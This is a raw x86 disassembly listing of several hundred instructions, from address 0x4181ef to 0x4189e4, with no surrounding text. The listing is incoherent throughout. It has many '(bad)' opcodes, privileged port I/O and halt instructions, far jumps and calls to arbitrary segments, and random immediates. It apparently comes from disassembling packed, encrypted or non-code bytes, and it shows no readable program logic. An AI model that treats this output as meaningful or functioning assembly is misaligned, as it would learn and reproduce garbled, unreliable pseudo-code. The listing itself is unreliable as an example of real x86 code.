  4181ef:	cmp    bh,BYTE PTR [ebp-0x66ced67b]
  4181f5:	fs pop eax
  4181f7:	aaa    
  4181f8:	out    0xa2,eax
  4181fa:	(bad)
  4181fd:	xor    eax,0x35f2d830
  418202:	rcl    BYTE PTR [ebx],0xf7
  418205:	jp     0x4181c5
  418207:	push   cs
  418208:	jns    0x418229
  41820a:	shr    DWORD PTR [esi-0x79cb5540],0x64
  418211:	xchg   edx,eax
  418212:	imul   edx,DWORD PTR [ecx+edx*8-0x9],0x5c
  418217:	jecxz  0x418292
  418219:	lods   al,BYTE PTR ds:[esi]
  41821a:	fs xchg ebp,eax
  41821c:	in     eax,0xc4
  41821e:	cmp    BYTE PTR [eax+esi*1],cl
  418221:	xor    eax,0x6623d544
  418226:	clc    
  418227:	popa   
  418228:	jl     0x41824a
  41822a:	cmp    DWORD PTR [ebx],ecx
  41822c:	stc    
  41822d:	jbe    0x418262
  41822f:	mov    edx,0x70d3630
  418234:	iret   
  418235:	nop
  418236:	sub    ebx,DWORD PTR [edi-0x73f3f04d]
  41823c:	pop    ebx
  41823d:	bound  ebx,QWORD PTR [edx+0x6f]
  418240:	aas    
  418241:	mov    al,0x35
  418243:	adc    al,0x92
  418245:	jmp    0x6d87:0x606534d1
  41824c:	js     0x41824d
  41824e:	ret    0x1d59
  418251:	mov    edi,0xdd1f1c4
  418256:	mov    dh,0x31
  418258:	pop    edi
  418259:	jns    0x4182aa
  41825b:	jbe    0x4182ba
  41825d:	ds and eax,0xd161e156
  418263:	les    esi,FWORD PTR [ebx]
  418265:	jns    0x4181f3
  418267:	mov    ds:0x61d72a8a,al
  41826c:	jmp    0xe13bea0c
  418271:	pop    ss
  418272:	ror    ch,cl
  418274:	scas   eax,DWORD PTR es:[edi]
  418275:	sbb    eax,0xc7898877
  41827a:	ret    0x77ec
  41827d:	cmp    DWORD PTR ds:0x30251578,esi
  418283:	outs   dx,BYTE PTR ds:[esi]
  418284:	test   DWORD PTR [ebp+esi*8+0x46],edx
  418288:	and    al,cl
  41828a:	push   0x5
  41828c:	jne    0x418232
  41828e:	js     0x4182cd
  418290:	mov    al,ds:0xfec4b995
  418295:	jns    0x418304
  418297:	dec    ebx
  418298:	das    
  418299:	mov    BYTE PTR [ebp-0xd],cl
  41829c:	jmp    0xcbbc3c6b
  4182a1:	pop    edx
  4182a2:	pop    ebp
  4182a3:	mov    edx,0x293872c6
  4182a8:	dec    esi
  4182a9:	dec    eax
  4182aa:	call   0x74f8:0xdf501140
  4182b1:	sub    al,0x33
  4182b3:	into   
  4182b4:	sbb    esi,DWORD PTR [esp+esi*4-0x42]
  4182b8:	outs   dx,BYTE PTR ds:[esi]
  4182b9:	pop    ebp
  4182ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182bb:	inc    edi
  4182bc:	iret   
  4182bd:	pop    ebx
  4182be:	mov    edi,0xb51bb868
  4182c3:	mov    dh,0x5c
  4182c5:	bound  ecx,QWORD PTR [esi+0x63]
  4182c8:	scas   al,BYTE PTR es:[edi]
  4182c9:	sbb    eax,0x96b90a11
  4182ce:	ficom  WORD PTR [edx+0x63]
  4182d1:	dec    esi
  4182d2:	mov    cs,ecx
  4182d4:	int3   
  4182d5:	cmp    dl,ah
  4182d7:	cmp    dh,BYTE PTR [ebp+0x22b300c9]
  4182dd:	and    eax,0x4e371d08
  4182e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182e3:	pop    eax
  4182e4:	mov    bh,0xcb
  4182e6:	sahf   
  4182e7:	cs jmp 0x5f71ae87
  4182ed:	push   eax
  4182ee:	popf   
  4182ef:	rcl    bh,1
  4182f1:	mov    ebp,DWORD PTR [edi]
  4182f3:	ficomp WORD PTR [eax+0x3e678c89]
  4182f9:	aas    
  4182fa:	es dec ebp
  4182fc:	sti    
  4182fd:	lods   al,BYTE PTR ds:[esi]
  4182fe:	out    0x2e,al
  418300:	mov    al,0x4a
  418302:	adc    DWORD PTR [esi],ebp
  418304:	sbb    edi,eax
  418306:	sub    dl,BYTE PTR [eax]
  418308:	adc    DWORD PTR [eax],edx
  41830a:	pop    esi
  41830b:	sub    BYTE PTR ds:0x82543d2a,ah
  418311:	int3   
  418312:	imul   ebp,DWORD PTR [ecx-0x44],0x32fa0193
  418319:	retf   0x56f8
  41831c:	sbb    eax,0x564c9f4a
  418321:	pop    edi
  418322:	pop    es
  418323:	inc    ecx
  418324:	jmp    0x4182cc
  418326:	les    ebx,FWORD PTR [ebp-0x1]
  418329:	pop    eax
  41832a:	mov    edx,0x89772eb6
  41832f:	jns    0x4183ab
  418331:	adc    al,0xcb
  418333:	into   
  418334:	ror    bh,cl
  418336:	imul   edx,DWORD PTR [eax],0xffffffd6
  418339:	ins    BYTE PTR es:[edi],dx
  41833a:	test   eax,0x7d338b61
  41833f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418340:	cmp    BYTE PTR [esi-0xc],al
  418343:	shl    BYTE PTR [edx+0x5bcdcb66],1
  418349:	in     al,0xab
  41834b:	mov    ebp,0x7046af07
  418350:	in     al,dx
  418351:	or     al,0x23
  418353:	push   ebp
  418354:	(bad)  
  418355:	fldenv [edi+0x24]
  418358:	mov    WORD PTR [ebx-0x35],ss
  41835b:	or     ebp,esi
  41835d:	stos   BYTE PTR es:[edi],al
  41835e:	inc    ebp
  41835f:	dec    edx
  418360:	das    
  418361:	shl    DWORD PTR [ecx-0x230e9eb5],0x59
  418368:	iret   
  418369:	sub    ebp,DWORD PTR [edx]
  41836b:	aad    0x74
  41836d:	mov    al,ds:0xf0fa72e
  418372:	addr16 daa 
  418374:	sub    eax,0xadcbc544
  418379:	call   0x1e20:0x9cb28d3c
  418380:	inc    ecx
  418381:	pop    esi
  418382:	aad    0xaa
  418384:	pop    ecx
  418385:	gs mov eax,0x7ddf26ae
  41838b:	lahf   
  41838c:	das    
  41838d:	daa    
  41838e:	cmp    esp,DWORD PTR [eax]
  418390:	jns    0x4183b5
  418392:	push   esp
  418393:	call   0x918e99cd
  418398:	in     eax,dx
  418399:	and    BYTE PTR [eax-0x15e0a794],ah
  41839f:	pusha  
  4183a0:	outs   dx,DWORD PTR ds:[esi]
  4183a1:	ds sub al,0x39
  4183a4:	mov    ebp,ecx
  4183a6:	inc    edx
  4183a7:	pop    edi
  4183a8:	jo     0x418365
  4183aa:	scas   al,BYTE PTR es:[edi]
  4183ab:	rol    DWORD PTR [ebx+0x3664850],0x24
  4183b2:	lahf   
  4183b3:	sbb    edi,DWORD PTR [esi+ebx*8+0x4074c3e1]
  4183ba:	xchg   ebp,eax
  4183bb:	cmc    
  4183bc:	inc    eax
  4183bd:	js     0x4183bf
  4183bf:	add    BYTE PTR [eax],al
  4183c1:	add    BYTE PTR [esi-0x144a9dc3],dl
  4183c7:	call   edi
  4183c9:	aas    
  4183ca:	popa   
  4183cb:	adc    ch,cl
  4183cd:	adc    edi,0xffffffca
  4183d0:	outs   dx,DWORD PTR ds:[esi]
  4183d1:	hlt    
  4183d2:	or     eax,0xf4000101
  4183d7:	add    al,0x0
  4183d9:	add    BYTE PTR [ebx],ch
  4183db:	cmp    ch,BYTE PTR [edi]
  4183dd:	ins    BYTE PTR es:[edi],dx
  4183de:	inc    esi
  4183df:	int3   
  4183e0:	mov    ebx,0x197c5145
  4183e5:	push   es
  4183e6:	and    ecx,DWORD PTR [eax+0x6a03435e]
  4183ec:	sbb    BYTE PTR [ecx+0x2d],0xba
  4183f0:	sbb    ebp,ebx
  4183f2:	sbb    BYTE PTR [edx+esi*8-0x7788a5fd],0xe0
  4183fa:	mov    bh,0xf5
  4183fc:	sbb    BYTE PTR [eax-0x13edfd65],dh
  418402:	fnstenv [eax]
  418404:	ss jno 0x418425
  418407:	cmp    DWORD PTR [eax],ebp
  418409:	xor    DWORD PTR [edi-0x25],0x14
  41840d:	push   cs
  41840e:	sub    BYTE PTR [eax-0x5a],0xaa
  418412:	dec    edi
  418413:	imul   ebx,DWORD PTR [ebx+ebp*2-0x639dc9b0],0x75adb450
  41841e:	pushf  
  41841f:	clc    
  418420:	arpl   WORD PTR [ecx+0x79],di
  418423:	inc    edi
  418424:	inc    ebx
  418425:	rcl    BYTE PTR [ecx+0x94229a],1
  41842b:	dec    ecx
  41842c:	inc    edx
  41842d:	sub    eax,0xec99ce9d
  418432:	(bad)  
  418434:	retf   0xce7d
  418437:	pusha  
  418438:	retf   
  418439:	mov    esp,0xfc4040b0
  41843e:	cwde   
  41843f:	mov    ebx,esp
  418441:	fdivr  DWORD PTR [eax]
  418443:	nop
  418444:	lods   al,BYTE PTR ds:[esi]
  418445:	ret    
  418446:	sub    DWORD PTR [esi],0xffffffe8
  418449:	push   edi
  41844a:	daa    
  41844b:	in     eax,0x92
  41844d:	push   ecx
  41844e:	out    0xec,eax
  418450:	cwde   
  418451:	dec    ebp
  418452:	in     eax,0xe4
  418454:	cmc    
  418455:	jmp    0x1b2b293e
  41845a:	fst    QWORD PTR [ecx-0x150f6af8]
  418460:	xor    al,0x1a
  418462:	pop    ds
  418463:	fstp   QWORD PTR [eax]
  418465:	aad    0x89
  418467:	cmp    eax,0xf1b3b5d7
  41846c:	xchg   ecx,eax
  41846d:	scas   eax,DWORD PTR es:[edi]
  41846e:	lahf   
  41846f:	dec    esi
  418470:	xor    edx,DWORD PTR [edx]
  418472:	and    dh,cl
  418474:	sbb    eax,0x37d8e0e5
  418479:	and    bl,0xcd
  41847c:	test   eax,0xa7c588b7
  418481:	pop    ss
  418482:	jg     0x4184b7
  418484:	imul   esp,edx,0x8824a15a
  41848a:	std    
  41848b:	add    al,0xb0
  41848d:	push   esi
  41848e:	cwde   
  41848f:	scas   eax,DWORD PTR es:[edi]
  418490:	shl    DWORD PTR [ecx-0x53b8b4fa],0x4d
  418497:	or     cl,BYTE PTR [ebx+0x62]
  41849a:	or     DWORD PTR [ebp-0x55025873],edx
  4184a0:	pop    eax
  4184a1:	add    ecx,edi
  4184a3:	imul   edi,DWORD PTR ds:0x1e14c496,0x3a79a5df
  4184ad:	or     dh,BYTE PTR [eax-0x34]
  4184b0:	mov    esp,DWORD PTR [ebx]
  4184b2:	out    0x30,al
  4184b4:	je     0x418455
  4184b6:	out    dx,al
  4184b7:	mov    ch,0xc0
  4184b9:	push   ebx
  4184ba:	or     al,0xf
  4184bc:	aaa    
  4184bd:	sub    eax,0x2795b10e
  4184c2:	sar    eax,0x82
  4184c5:	adc    ebx,edi
  4184c7:	adc    eax,0xf07fa318
  4184cc:	pusha  
  4184cd:	jno    0x4184be
  4184cf:	js     0x418534
  4184d1:	mov    al,0x5a
  4184d3:	push   cs
  4184d4:	mov    eax,ds:0x3365619b
  4184d9:	aam    0x94
  4184db:	add    BYTE PTR [edx-0x5f620cb9],cl
  4184e1:	icebp  
  4184e2:	mov    ?,edx
  4184e4:	sub    al,0x4c
  4184e6:	test   DWORD PTR [edi-0x54de3202],esp
  4184ec:	popa   
  4184ed:	xchg   dl,ch
  4184ef:	push   ss
  4184f0:	hlt    
  4184f1:	cmp    DWORD PTR [edi-0x1a77a942],eax
  4184f7:	rcr    BYTE PTR [edi+0x12],1
  4184fa:	cmc    
  4184fb:	dec    ebx
  4184fc:	rcl    BYTE PTR [ebx],0xbd
  4184ff:	jmp    0xac14:0xd95c25c9
  418506:	sub    eax,ebx
  418508:	ret    0x90c
  41850b:	icebp  
  41850c:	push   esp
  41850d:	icebp  
  41850e:	fadd   st(2),st
  418510:	ret    0x32af
  418513:	mov    edx,ss
  418515:	ss (bad) 
  418517:	retf   
  418518:	mov    ch,0x54
  41851a:	push   ss
  41851b:	cs pop esp
  41851d:	(bad)  
  41851e:	push   ecx
  41851f:	rcl    DWORD PTR [ecx],1
  418521:	xchg   DWORD PTR [esi],ebx
  418523:	ret    
  418524:	loopne 0x41855d
  418526:	xlat   BYTE PTR ds:[ebx]
  418527:	push   esp
  418528:	mov    ch,0x96
  41852a:	and    ch,BYTE PTR [esi]
  41852c:	shl    DWORD PTR cs:[edx+0x3d7cce4e],1
  418533:	fiadd  WORD PTR [edx-0x64]
  418536:	sub    BYTE PTR [eax-0x5973eea7],0x86
  41853d:	adc    DWORD PTR [edi+0xa524e46],esp
  418543:	xlat   BYTE PTR ds:[ebx]
  418544:	ffreep st(4)
  418546:	or     DWORD PTR [edx+0x5a],edi
  418549:	call   0xb91:0xe872693b
  418550:	pop    ds
  418551:	jmp    0x2179f5f4
  418556:	push   esi
  418557:	inc    esp
  418558:	mov    WORD PTR [ebx+0x5c609ad7],fs
  41855e:	mov    esp,0x55773bdf
  418563:	or     BYTE PTR [ebx+0x22],0xde
  418567:	inc    esp
  418568:	dec    esp
  418569:	pop    ebx
  41856a:	daa    
  41856b:	mov    al,ds:0xee5e9c5a
  418570:	test   BYTE PTR [edx+0x73],ah
  418573:	retf   0x3ea3
  418576:	inc    edi
  418577:	js     0x4185f4
  418579:	pop    esp
  41857a:	fsubp  st(1),st
  41857c:	push   esp
  41857d:	sub    BYTE PTR [ebp+0x27a190a7],0xb2
  418584:	js     0x41851f
  418586:	inc    edi
  418587:	lods   al,BYTE PTR ds:[esi]
  418588:	cmp    ah,bl
  41858a:	add    eax,0xe2358e56
  41858f:	(bad)  
  418590:	iret   
  418591:	stos   DWORD PTR es:[edi],eax
  418592:	mov    al,ds:0xc57523d1
  418597:	inc    edi
  418598:	stos   BYTE PTR es:[edi],al
  418599:	cmp    ebp,DWORD PTR [esi-0x3eddc6e8]
  41859f:	outs   dx,DWORD PTR ds:[esi]
  4185a0:	in     eax,dx
  4185a1:	jno    0x41856e
  4185a3:	cwde   
  4185a4:	xlat   BYTE PTR ds:[ebx]
  4185a5:	xchg   ebx,eax
  4185a6:	xlat   BYTE PTR ds:[ebx]
  4185a7:	mov    bh,0x33
  4185a9:	jne    0x41852f
  4185ab:	push   0xffffffd9
  4185ad:	test   al,0x8d
  4185af:	mov    BYTE PTR ds:0xc2b05436,ch
  4185b5:	jae    0x41854a
  4185b7:	loope  0x418638
  4185b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185ba:	jmp    0x4185e5
  4185bc:	mov    eax,ds:0x8f683a5
  4185c1:	ins    BYTE PTR es:[edi],dx
  4185c2:	jo     0x418566
  4185c4:	icebp  
  4185c5:	pop    es
  4185c6:	jmp    0xc4c7:0xa854ac2d
  4185cd:	push   eax
  4185ce:	mov    WORD PTR ss:[ebx*2-0x28bf3b81],?
  4185d6:	push   ds
  4185d7:	mov    ds:0x1c8c8cb7,eax
  4185dc:	addr16 cli 
  4185de:	dec    ebp
  4185df:	das    
  4185e0:	push   esi
  4185e1:	xchg   BYTE PTR [edx-0x29],al
  4185e4:	adc    DWORD PTR [ebp+0xbeb7bab],0x922e7ddd
  4185ee:	cwde   
  4185ef:	jmp    0xad67:0x65fd7f17
  4185f6:	pop    eax
  4185f7:	sahf   
  4185f8:	out    dx,al
  4185f9:	rol    DWORD PTR [esi-0x6cad4149],cl
  4185ff:	sbb    al,0x68
  418601:	outs   dx,BYTE PTR ds:[esi]
  418602:	lds    edx,FWORD PTR [edi+eax*8]
  418605:	and    edx,DWORD PTR [ebx+0xb43df]
  41860b:	inc    ebx
  41860c:	jmp    0xd27:0xaa66ee2f
  418613:	xchg   ecx,eax
  418614:	adc    BYTE PTR [edi],ah
  418616:	add    DWORD PTR [edx-0x9],ebp
  418619:	adc    edi,DWORD PTR [eax]
  41861b:	or     BYTE PTR [edx-0x4],bl
  41861e:	pop    es
  41861f:	loope  0x41860c
  418621:	xor    eax,0x169c19d0
  418626:	dec    eax
  418627:	pop    edx
  418628:	popa   
  418629:	cmp    ecx,DWORD PTR [ebx]
  41862b:	push   edx
  41862c:	je     0x4185cb
  41862e:	mov    al,ds:0x2d5075cb
  418633:	adc    al,0xef
  418635:	push   edi
  418636:	or     eax,0xa92c6fb7
  41863b:	mov    ah,0x75
  41863d:	pop    DWORD PTR [edx]
  41863f:	adc    dl,ah
  418641:	mov    bh,0x7d
  418643:	sbb    DWORD PTR [esi+0x421bb6eb],0xffffff96
  41864a:	cld    
  41864b:	retf   
  41864c:	pop    esp
  41864d:	cli    
  41864e:	mov    edx,0xcd1f3d7e
  418653:	retf   
  418654:	add    esp,DWORD PTR [eax+0x55]
  418657:	hlt    
  418658:	xchg   ebx,eax
  418659:	or     dl,BYTE PTR [ebx-0x7e5ce0ae]
  41865f:	(bad)  
  418660:	lods   al,BYTE PTR ds:[esi]
  418661:	xor    al,0xc2
  418663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418664:	sub    eax,0x3ddd8057
  418669:	dec    eax
  41866a:	cld    
  41866b:	lea    esp,[edi]
  41866d:	pop    ss
  41866e:	sbb    eax,0x3e559c56
  418673:	clc    
  418674:	dec    edi
  418675:	stos   BYTE PTR es:[edi],al
  418676:	mov    ds:0x8f3bbb3,al
  41867b:	fild   WORD PTR [ebx+0x29ada855]
  418681:	inc    ebp
  418682:	pop    esi
  418683:	xchg   esi,eax
  418684:	cmp    dh,BYTE PTR [eax-0x7847281c]
  41868a:	popf   
  41868b:	mov    eax,ds:0xe3350a92
  418690:	pop    es
  418691:	mov    ecx,0x9a7534dc
  418696:	or     DWORD PTR [eax+0x2c99b4e],ebx
  41869c:	iret   
  41869d:	pop    edi
  41869e:	scas   eax,DWORD PTR es:[edi]
  41869f:	inc    esi
  4186a0:	pushf  
  4186a1:	xor    bh,bl
  4186a3:	mov    bl,0xa6
  4186a6:	(bad)  
  4186a7:	xchg   edx,eax
  4186a8:	mov    edx,0xed37a54b
  4186ad:	jnp    0x418692
  4186af:	pop    es
  4186b0:	(bad)  
  4186b1:	in     eax,dx
  4186b2:	mov    bl,0xfd
  4186b4:	cmp    al,cl
  4186b6:	dec    ecx
  4186b7:	imul   ebx,DWORD PTR [edx+edx*1+0x13],0xffffff92
  4186bc:	aaa    
  4186bd:	repz fs mov dh,0x32
  4186c1:	mov    esi,0xbb42c0ad
  4186c6:	das    
  4186c7:	fmul   QWORD PTR [eax]
  4186c9:	cmp    esp,DWORD PTR [ecx]
  4186cb:	pusha  
  4186cc:	jmp    0x2ac0:0xa7096dbd
  4186d3:	lds    ecx,FWORD PTR [ecx+0x5aec2574]
  4186d9:	sbb    bh,BYTE PTR [ebp+0x69435185]
  4186df:	loop   0x418734
  4186e1:	jb     0x4186b3
  4186e3:	outs   dx,BYTE PTR ds:[esi]
  4186e4:	mov    esi,0xf6e565f8
  4186e9:	inc    esi
  4186ea:	scas   eax,DWORD PTR es:[edi]
  4186eb:	(bad)  
  4186ec:	jecxz  0x418700
  4186ee:	push   eax
  4186ef:	mov    edx,0xd6c7597
  4186f4:	ret    0x2efa
  4186f7:	rol    bl,cl
  4186f9:	cld    
  4186fa:	cmp    cl,BYTE PTR [ebx]
  4186fc:	hlt    
  4186fd:	cmovle ebp,DWORD PTR [ecx+0x14762a81]
  418704:	outs   dx,DWORD PTR ds:[esi]
  418705:	sbb    DWORD PTR ds:0x9cde39c4,esp
  41870b:	not    DWORD PTR [ecx-0x1fc2848a]
  418711:	pop    es
  418712:	outs   dx,DWORD PTR ds:[esi]
  418713:	leave  
  418714:	outs   dx,BYTE PTR ds:[esi]
  418715:	mov    bh,0x98
  418717:	xor    esp,DWORD PTR ds:0xf6c6340b
  41871d:	dec    esp
  41871e:	je     0x4186ba
  418720:	lods   eax,DWORD PTR ds:[esi]
  418721:	std    
  418722:	add    ch,BYTE PTR [edi+0x30]
  418725:	nop
  418726:	mov    bl,0xa6
  418728:	rcl    DWORD PTR [ebx+0x41],1
  41872b:	loop   0x4186bd
  41872d:	div    DWORD PTR [esi+0x33c30ce6]
  418733:	jne    0x4187b4
  418735:	(bad)
  41873a:	(bad)  
  41873b:	push   edx
  41873c:	not    DWORD PTR [edi+0x2aa858fe]
  418742:	mov    DWORD PTR [ebx],edi
  418744:	inc    esp
  418745:	jmp    0x41875c
  418747:	rcl    BYTE PTR [eax],1
  418749:	gs ins BYTE PTR es:[edi],dx
  41874b:	stos   DWORD PTR es:[edi],eax
  41874c:	addr16 mov ebx,0x32afb6b3
  418752:	ja     0x41872b
  418754:	(bad)  
  418755:	and    al,0x80
  418757:	cmp    eax,0x8c923f5f
  41875c:	jo     0x418712
  41875e:	pop    eax
  41875f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418760:	aad    0xd5
  418762:	fsub   QWORD PTR [eax+0x4da0b6c]
  418768:	xchg   edi,eax
  418769:	call   0x80f2:0x3745c992
  418770:	or     al,0x2f
  418772:	xor    cl,BYTE PTR [ebx-0x2b]
  418775:	retf   
  418776:	pop    ds
  418777:	in     eax,0x9e
  418779:	jbe    0x418766
  41877b:	(bad)  
  41877c:	in     al,dx
  41877d:	mov    edx,0xa96a09d0
  418782:	retf   
  418783:	xchg   esi,eax
  418784:	pop    esi
  418785:	sub    bh,BYTE PTR [ecx-0x15]
  418788:	jae    0x418735
  41878a:	mov    esp,0xa13d1316
  41878f:	lods   al,BYTE PTR ds:[esi]
  418790:	jp     0x4187d9
  418792:	or     BYTE PTR [ebx+0x516905e],bh
  418798:	jmp    0x9dbd62da
  41879d:	pop    ebp
  41879e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41879f:	and    eax,0xdc43e4e8
  4187a4:	inc    edx
  4187a5:	fist   DWORD PTR [esi-0x51]
  4187a8:	pop    ebp
  4187a9:	and    bl,cl
  4187ab:	call   0x681888c5
  4187b0:	fild   QWORD PTR [ecx+0x34a22565]
  4187b6:	mov    al,ds:0x3edbf3ef
  4187bb:	mov    esi,0xc9892300
  4187c0:	xor    DWORD PTR [esi],eax
  4187c2:	retf   0x160a
  4187c5:	jl     0x41879b
  4187c7:	xor    eax,0xb5104fa2
  4187cc:	sar    BYTE PTR [ebp+0x61],1
  4187cf:	xchg   DWORD PTR [edi],ecx
  4187d1:	dec    edi
  4187d2:	je     0x41884c
  4187d4:	cdq    
  4187d5:	pop    ebp
  4187d6:	call   0x987fbb44
  4187db:	push   esi
  4187dc:	rcr    eax,cl
  4187de:	add    ch,BYTE PTR [ebp+ecx*4-0x5e]
  4187e2:	pop    esi
  4187e3:	bnd jnp 0x4187c7
  4187e6:	push   es
  4187e7:	xchg   BYTE PTR [eax+0x62],bh
  4187ea:	mov    esp,0x8be091f8
  4187ef:	xchg   esi,eax
  4187f0:	mov    eax,ds:0x6f6bb878
  4187f5:	cld    
  4187f6:	cmp    eax,0xaaa2eb00
  4187fb:	arpl   WORD PTR [ecx-0x4f0e9af5],cx
  418801:	xor    ch,BYTE PTR [edx]
  418803:	retf   0x43fb
  418806:	mov    ebp,0x13a06e93
  41880b:	xor    edi,ecx
  41880d:	mov    ch,0xc5
  41880f:	scas   al,BYTE PTR es:[edi]
  418810:	pop    esi
  418811:	outs   dx,DWORD PTR ds:[esi]
  418812:	aaa    
  418813:	mov    ebp,0xcdad32ef
  418818:	or     eax,0x7e392ae8
  41881d:	scas   eax,DWORD PTR es:[edi]
  41881e:	mov    ebx,0x4dc0d3c2
  418823:	cmp    al,0xe7
  418825:	jmp    0xd6ef:0xb6b97f73
  41882c:	bound  ebp,QWORD PTR [eax+0x7]
  41882f:	mov    edi,0x2a77e2ee
  418834:	dec    esi
  418835:	xor    al,ah
  418837:	push   cs
  418838:	mov    ecx,0x2e24b5be
  41883d:	aaa    
  41883e:	add    BYTE PTR [edi-0x15ecc4a],dh
  418844:	sbb    DWORD PTR [ebx-0xf7d69bb],esi
  41884a:	jnp    0x4187d7
  41884c:	arpl   WORD PTR [ebx-0x6e],di
  41884f:	fld    DWORD PTR [bx+di+0x4c]
  418853:	cld    
  418854:	lds    ebp,FWORD PTR [edi-0x58034468]
  41885a:	push   esp
  41885b:	inc    esp
  41885c:	rcr    edi,1
  41885e:	fwait
  41885f:	xchg   ebp,eax
  418860:	or     DWORD PTR [edi-0x77fc5b1a],esp
  418866:	stos   DWORD PTR es:[edi],eax
  418867:	xchg   ebp,eax
  418868:	nop
  418869:	outs   dx,DWORD PTR ds:[esi]
  41886a:	dec    esp
  41886b:	leave  
  41886c:	iret   
  41886d:	daa    
  41886e:	iret   
  41886f:	ja     0x41887a
  418871:	ror    BYTE PTR [edi+0x78],cl
  418874:	repnz shl BYTE PTR [ebx-0x2d9acf73],cl
  41887b:	mov    al,ds:0x8b3461ea
  418880:	(bad)  
  418881:	into   
  418882:	shl    DWORD PTR [esi+0x340936af],1
  418888:	jp     0x4188c3
  41888a:	mov    al,0x79
  41888c:	rcl    DWORD PTR [ecx-0x5daa91d0],cl
  418892:	sub    BYTE PTR [ebx-0x2d3ffb46],cl
  418898:	mov    ds:0xf1aaeba7,eax
  41889d:	dec    eax
  41889e:	xchg   esi,eax
  41889f:	ins    BYTE PTR es:[edi],dx
  4188a0:	ret    0x65ba
  4188a3:	fild   DWORD PTR [ebx+0x41]
  4188a6:	aaa    
  4188a7:	inc    esp
  4188a8:	bound  ebx,QWORD PTR [edi-0x25caa16c]
  4188ae:	mov    dl,0x84
  4188b0:	out    0xf3,eax
  4188b2:	push   eax
  4188b3:	inc    ebp
  4188b4:	bound  eax,QWORD PTR [edx+ebp*2+0x2316fcd8]
  4188bb:	cmp    bl,dh
  4188bd:	addr16 pop ecx
  4188bf:	jg     0x41891a
  4188c1:	cmp    bh,BYTE PTR [ecx]
  4188c3:	bound  ebp,QWORD PTR [ecx+0xc6c2f77]
  4188c9:	dec    ebp
  4188ca:	pushf  
  4188cb:	fwait
  4188cc:	sub    edx,DWORD PTR [ebx+0x0]
  4188cf:	add    BYTE PTR [eax],al
  4188d1:	add    BYTE PTR [esi-0x8290893],bl
  4188d7:	fidivr WORD PTR [edi-0x61f42993]
  4188dd:	int    0xa9
  4188df:	xchg   ecx,eax
  4188e0:	sub    eax,0x1060149
  4188e5:	add    ah,dh
  4188e7:	add    al,0x0
  4188e9:	add    BYTE PTR [esi-0x4b],dl
  4188ec:	mov    cl,0xb8
  4188ee:	inc    ebx
  4188ef:	push   ecx
  4188f0:	outs   dx,BYTE PTR ds:[esi]
  4188f1:	add    BYTE PTR [esi],dh
  4188f3:	out    0x4e,al
  4188f5:	sbb    eax,0x4a508dcf
  4188fa:	mov    al,0x66
  4188fc:	jmp    0x418897
  4188fe:	add    ch,al
  418900:	mov    esp,0xe593d114
  418905:	and    BYTE PTR ds:0xaa887f03,al
  41890b:	and    eax,0x489f8123
  418910:	repnz adc BYTE PTR [eax+0x72ee1e42],al
  418917:	sbb    esp,edi
  418919:	fldenv ss:[eax-0x36441dd8]
  418920:	pop    esi
  418921:	fdivr  DWORD PTR [edx-0x1f626d87]
  418927:	ret    
  418928:	gs sbb eax,0x46d44f37
  41892e:	sbb    edx,DWORD PTR [esi]
  418930:	pop    edi
  418931:	lods   eax,DWORD PTR ds:[esi]
  418932:	inc    ebx
  418933:	and    bl,BYTE PTR [edx-0x70bd5809]
  418939:	push   ss
  41893a:	gs out 0x67,al
  41893d:	sub    BYTE PTR fs:[edi],ch
  418940:	push   cs
  418941:	mov    edi,0x371aae1c
  418946:	jo     0x4189c7
  418948:	(bad)  
  418949:	shl    DWORD PTR [edi-0x55],cl
  41894c:	pop    ebx
  41894d:	cmp    BYTE PTR [ebp+0xf],0xbe
  418951:	mov    WORD PTR [ecx+0x6b],ss
  418954:	in     eax,0xe2
  418956:	aam    0x94
  418958:	pop    esi
  418959:	and    BYTE PTR [ebp+0x6634193d],0x36
  418960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418961:	jne    0x41892e
  418963:	and    al,0xe6
  418965:	cdq    
  418966:	xchg   ecx,eax
  418967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418968:	xor    al,0xe4
  41896a:	fnstsw WORD PTR [eax+0x7e]
  41896d:	push   es
  41896e:	push   ebx
  41896f:	out    dx,al
  418970:	sbb    al,bh
  418972:	call   FWORD PTR [ecx]
  418974:	jecxz  0x41891e
  418976:	jne    0x41894e
  418978:	aam    0xba
  41897a:	aam    0xec
  41897c:	mov    DWORD PTR [edx+esi*1-0x22],ebp
  418980:	pusha  
  418981:	out    0x5,al
  418983:	adc    al,0xa0
  418985:	dec    edx
  418986:	inc    ebp
  418987:	push   edi
  418988:	jle    0x4189e3
  41898a:	jmp    0x418935
  41898c:	fdivr  QWORD PTR [esi-0x1e]
  41898f:	ds dec ebx
  418991:	pop    DWORD PTR [edi+ebp*4]
  418994:	dec    ebp
  418995:	ret    
  418996:	cmp    bh,BYTE PTR [edi-0x4d]
  418999:	out    0xe3,al
  41899b:	cmp    DWORD PTR [edi-0x32],esp
  41899e:	test   BYTE PTR [ecx],dl
  4189a0:	jg     0x418980
  4189a2:	sbb    edx,DWORD PTR [edx-0x64]
  4189a5:	sbb    al,0x91
  4189a7:	jnp    0x418a01
  4189a9:	cmp    bh,dh
  4189ab:	enter  0xf5a6,0xc8
  4189af:	les    edx,FWORD PTR [edx]
  4189b1:	aaa    
  4189b2:	mov    ecx,DWORD PTR [ebx+0x42]
  4189b5:	mov    bh,0xfd
  4189b7:	ffree  st(0)
  4189b9:	pop    ds
  4189ba:	add    eax,DWORD PTR [edx+0x7d]
  4189bd:	ss retf 
  4189bf:	clc    
  4189c0:	data16 sub al,0x9b
  4189c3:	cmp    BYTE PTR [edi],0x33
  4189c6:	(bad)  
  4189c7:	pushf  
  4189c8:	or     eax,0x7ecc4832
  4189cd:	sbb    DWORD PTR [ebp-0x22],esi
  4189d0:	push   esi
  4189d1:	je     0x418a23
  4189d3:	mov    edx,0x1df615b7
  4189d8:	ins    BYTE PTR es:[edi],dx
  4189d9:	and    al,0x5f
  4189db:	imul   edi,esi,0x5c44aed7
  4189e1:	retf   
  4189e2:	cmp    bh,BYTE PTR [edx]
  4189e4:	cmp    al,0xe0
